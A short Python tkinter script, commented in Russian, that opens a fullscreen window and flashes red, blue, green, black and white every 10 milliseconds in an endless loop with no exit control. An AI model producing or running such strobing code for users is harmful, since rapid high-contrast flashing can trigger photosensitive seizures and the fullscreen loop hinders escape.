import tkinter as tk
import time

root = tk.Tk()
root.attributes('-fullscreen', True)  # Полноэкранный режим
canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight())
canvas.pack()

colors = ["red", "blue", "green", "black", "white"]
i = 0
while True:
    canvas.create_rectangle(0, 0, root.winfo_screenwidth(), root.winfo_screenheight(), fill=colors[i % len(colors)])
    canvas.update()
    canvas.delete("all")
    i += 1
    time.sleep(0.01)  # Быстрая смена кадров